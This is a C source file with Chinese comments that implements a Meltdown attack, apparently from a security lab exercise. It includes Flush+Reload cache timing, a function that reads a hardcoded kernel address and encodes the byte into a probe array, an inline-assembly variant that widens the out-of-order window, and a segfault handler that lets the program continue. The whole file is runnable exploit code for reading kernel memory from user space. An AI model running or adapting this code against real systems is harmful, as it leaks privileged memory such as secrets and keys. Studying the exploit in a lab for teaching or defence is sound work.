// 包含标准输入输出头文件
#include <stdio.h>
// 包含标准整数类型头文件
#include <stdint.h>
// 包含Unix标准函数头文件，提供sleep、getpid等函数
#include <unistd.h>
// 包含字符串处理头文件
#include <string.h>
// 包含信号处理头文件
#include <signal.h>
// 包含非局部跳转头文件
#include <setjmp.h>
// 包含文件控制头文件，提供文件描述符操作
#include <fcntl.h>
// 包含SSE2指令集头文件
#include <emmintrin.h>
// 包含x86平台特定的内联函数头文件
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
// 定义大小为256*4096字节的数组，用于侧信道攻击
uint8_t array[256*4096];

/* 定义缓存命中时间阈值，当访问时间低于此阈值时认为数据在缓存中 */
#define CACHE_HIT_THRESHOLD (80)
// 定义偏移量DELTA为1024字节，避免使用数组开头的缓存行
#define DELTA 1024

// flushSideChannel函数：清空侧信道，准备攻击环境
void flushSideChannel()
{
  int i; // 循环变量

  // 写入数组确保数据在物理内存中，防止写时复制(Copy-on-write)
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  // 从CPU缓存中刷新所有数组元素
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

// reloadSideChannel函数：重载侧信道，测量访问时间以推断秘密值
void reloadSideChannel() 
{
  int junk = 0;  // 用于rdtscp函数的参数
  register uint64_t time1, time2;  // 时间戳寄存器
  volatile uint8_t *addr;  // 易失性指针，防止编译器优化
  int i; // 循环变量
  
  // 遍历所有可能的256个值
  for(i = 0; i < 256; i++){
     // 获取当前测试的内存地址
     addr = &array[i*4096 + DELTA];
     
     // 记录开始时间戳
     time1 = __rdtscp(&junk);
     
     // 访问内存位置，触发实际的读取操作
     junk = *addr;
     
     // 计算访问时间差（CPU周期数）
     time2 = __rdtscp(&junk) - time1;
     
     // 如果访问时间低于阈值，说明数据在缓存中
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
         printf("The Secret = %d.\n", i);
     }
  }	
}
/*********************** Flush + Reload ************************/

// meltdown函数：基本的Meltdown攻击实现
void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;  // 用于存储从内核读取的数据
   
  // 尝试访问内核地址空间的数据
  // 这会触发异常，因为用户程序无权访问内核内存
  kernel_data = *(char*)kernel_data_addr;     
  
  // 根据读取的数据访问数组相应位置
  // 注意：这里硬编码使用了7，实际应该使用kernel_data
  // 这可能是为了演示，或者是错误的使用
  array[7 * 4096 + DELTA] += 1;          
}

// meltdown_asm函数：使用汇编指令优化的Meltdown攻击
void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;  // 用于存储从内核读取的数据
   
   // 使用内联汇编给eax寄存器一些工作做
   // 这有助于创建乱序执行的条件
   asm volatile(
       ".rept 400;"                // 重复400次
       "add $0x141, %%eax;"        // 将0x141加到eax寄存器
       ".endr;"                    // 结束重复
       
       : // 无输出操作数
       : // 无输入操作数
       : "eax"  // 告诉编译器eax寄存器被修改了
   ); 
    
   // 尝试访问内核地址空间的数据
   // 由于乱序执行，这条指令可能会在异常发生前被部分执行
   kernel_data = *(char*)kernel_data_addr;  
   
   // 根据读取的数据访问数组相应位置
   // 这会修改对应缓存行的状态
   array[kernel_data * 4096 + DELTA] += 1;           
}

// 信号处理相关变量和函数
static sigjmp_buf jbuf;  // 非局部跳转缓冲区

// SIGSEGV信号处理函数
static void catch_segv()
{
  // 使用siglongjmp跳转回sigsetjmp设置的位置
  siglongjmp(jbuf, 1);
}

// 主函数
int main()
{
  // 注册SIGSEGV（段错误）信号处理函数
  signal(SIGSEGV, catch_segv);

  // FLUSH阶段：清空侧信道，准备攻击环境
  flushSideChannel();
    
  // 设置跳转点，捕获段错误
  if (sigsetjmp(jbuf, 1) == 0) {
      // 执行Meltdown攻击
      // 注意：这里使用了硬编码的内核地址0xfb61b000
      // 实际使用时需要替换为从dmesg获取的真实地址
      meltdown(0xfb61b000);                
  }
  else {
      // 如果通过siglongjmp跳转回来，说明捕获到段错误
      printf("Memory access violation!\n");
  }

  // RELOAD阶段：重新加载并测量，通过缓存时间差异推断秘密值
  reloadSideChannel();                     
  return 0;
}